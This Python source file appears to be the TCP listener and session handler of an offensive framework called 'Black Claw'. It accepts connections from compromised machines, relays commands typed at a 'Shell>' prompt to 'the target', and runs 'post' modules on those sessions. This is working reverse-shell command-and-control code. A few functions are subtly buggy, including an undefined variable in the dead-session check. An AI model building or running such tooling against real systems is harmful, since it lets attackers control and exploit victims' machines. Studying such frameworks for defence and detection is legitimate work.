#!/usr/bin/env python3
"""
TCP Server Module for Black Claw
"""
import sys, os, socket,string,random
runpath = os.path.dirname(os.path.realpath(__file__))
sys.path.append(os.path.join(runpath,'..'))
approot = os.path.abspath(os.path.join(runpath, os.pardir))
import lib.events as event
import lib.shm as shm
from terminaltables import AsciiTable


# This is a basic TCP server which can listen on a specified port
class TCPServer():
    def __init__(self,address='127.0.0.1',port=9001,connections=1):
        self.server_address = address
        self.server_port = port
        self.connections_number = connections
        self.client_connection = None
        self.client_address = None
        self.keep_interact = True
        self.terminated = False
        self.name = self.__generate_name()
    
    def listen(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((self.server_address, self.server_port))
            print(f"[+] Listening on {self.server_address}:{str(self.server_port)}")
            s.listen(self.connections_number)
            conn, addr = s.accept()
            self.client_connection = conn
            self.client_address = addr
            print(f"[+] Client Connected with address {str(addr)}")
            c = ClientHandler(self.client_connection)
            c.client_address = addr[0]
            c.client_port = addr[1]
            c.name = self.__generate_name()            
            shm.sessions.append(c)
            #self.session_created.fire(self)
        except Exception as x:
            print(f"[-] {x}")
            
    def run(self):
        self.listen()
    def interact(self):
        try:
            self.keep_interact = True
            while self.keep_interact == True:
                command = input("Shell> ") # Get user input and store it in command variable
                if command.startswith(':terminate'): # If we got terminate command, inform the client and close conn.send('terminate')
                    self.client_connection.send(command.encode())
                    self.client_connection.close()
                    self.terminated = True
                    break
                elif command.startswith(':bg'):
                    self.keep_interact = False       
                else:
                    self.client_connection.send(command.encode()) # Otherwise we will send the command to the target
                    print(self.client_connection.recv(1024).decode('utf8')) # and print the result that we got back
        except Exception as x:
            print(f"[-] {x}")
    def run_command(self,command):
        self.client_connection.send(command.encode()) # Otherwise we will send the command to the target
        print(self.client_connection.recv(1024).decode('utf8')) # and print the result that we got back       
    def get_command_result(self,command):
        self.client_connection.send(command.encode()) 
        return self.client_connection.recv(1024).decode('utf8')
    def get_address(self):
        return self.client_address
    def check_session_alive(self):
        if self.client_connection._closed == False:
            return True
        else:
            return False
    def __generate_name(self,size=8, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))        
    
    
class MultiTCPServer:
    def __init__(self,address='127.0.0.1',port=9001,connections=5):
        self.clients = []
        self.connected_clinets = 0
        self.connections_number = connections
        self.keep_running = True
        self.server_address = address
        self.server_port = port
        
        # Class Events
        self.session_created = event.EventHook()
        self.session_terminated = event.EventHook()
    def listen(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.bind((self.server_address, self.server_port))
            print(f"[+] Listening on {self.server_address}:{str(self.server_port)}")
            s.listen(self.connections_number)
            while self.keep_running == True and self.connected_clinets < self.connections_number:
                conn, addr = s.accept()
                self.client_address = addr
                print(f"[+] Client Connected with address {str(addr)}")
                c = ClientHandler(conn)
                c.client_address = addr[0]
                c.client_port = addr[1]
                c.name = self.__generate_name()
                self.session_created.fire(c)
                self.connected_clinets += 1
        except Exception as x:
            print(f"[-] {x}")
            
    def run(self):
        self.listen()    
        
    def check_dead_sessions(self):
        dead_sessions = []
        has_dead = False
        for c in clients:
            if c.check_session_alive() == False:
                dead_sessions.append(c)
                has_dead = True
        return has_dead,dead_sessions
    def __generate_name(self,size=8, chars=string.ascii_uppercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))  
                
class ClientHandler:
    def __init__(self,sock):
        self.name = ''
        self.client_connection = sock
        self.client_address = ''
        self.client_port = 0
        self.keep_interact = True
        self.terminated = False
        self.post_modules = []
        self.run_module = False # detect to mmodule is runnod or not in the command turn
        # Client Events 
        
        
    def interact(self):
        try:
            self.keep_interact = True
            self.__get_all_post_modules()
            while self.keep_interact == True:
                command = input(f"({self.name})Shell> ") # Get user input and store it in command variable
                self.command_interpreter(command)
                print()
        except Exception as x:
            print(f"[-] {x}")
    def run_command(self,command):
        self.client_connection.send(command.encode()) # Otherwise we will send the command to the target
        print(self.client_connection.recv(8192).decode('utf8')) # and print the result that we got back       
    def get_command_result(self,command):
        self.client_connection.send(command.encode()) 
        return self.client_connection.recv(8192).decode('utf8')
    def get_address(self):
        return self.client_address
    def check_session_alive(self):    
        if self.client_connection._closed == False:
            return True
        else:
            return False        
        
    def terminate(self):
        self.run_command(':terminate')
        self.client_connection.close()
        self.terminated = True
        self.keep_interact == False
    def __get_all_post_modules(self):
        self.post_modules.clear()
        for m in shm.modules:
            if m.get_module_type() == 'post':
                self.post_modules.append(m)
    def __get_module_by_name(self,name):
        for m in self.post_modules:
            if ":"+m.name == name:
                return m
        return None
    
    def print_help(self):
        help = """
        Available Commands
        -------------------
        
        :<module> <param>      Run modules with parameters
        :help, :?              Show this menu
        :terminate             Terminate the connection
        :bg                    Send the interactive shell to background
        <command>              Run command on the target machine
        list modules           List all available modules
        
        """
        print(help)
        
    def command_interpreter(self,command):
        
        # Itt azt vizsgálom, hogy egy modult akarok-e futtatni.
        # a modul hívás úgy történik, hogy :<modul neve> <paraméter>
        if command.startswith(':'):
            # Ha scapce van benne akkor lehet splittelni
            p = command.split(' ')[0]
            m = self.__get_module_by_name(p)
            if m != None:
                self.run_module = True
                m.set_session_name(self.name)
                m.run(command)
            # ha ide jut akkor valószínűleg nem modul neve lett beírva.
            
            
        if command.startswith(':terminate'): # If we got terminate command, inform the client and close conn.send('terminate')
            self.client_connection.send(command.encode())
            self.client_connection.close()
            self.terminated = True
            self.keep_interact = False
        # background the session
        elif command.startswith(':bg'):
            self.keep_interact = False
        elif command.lower() == ":help":
            self.print_help()
        elif command.lower() == 'list modules':
            table_data = []
            header = ['#','Name','Description']
            table_data.append(header)
            c = 0
            for m in self.post_modules:
                table_data.append([str(c)+".",m.module.info['name'],m.module.info['description']])
                c+=1
            table = AsciiTable(table_data)
            print(table.table)
        else:
            if self.run_module == False:
                self.client_connection.send(command.encode()) # Otherwise we will send the command to the target
                print(self.client_connection.recv(8192).decode('utf8')) # and print the result that we got back 
        # Set run module to false
        self.run_module = False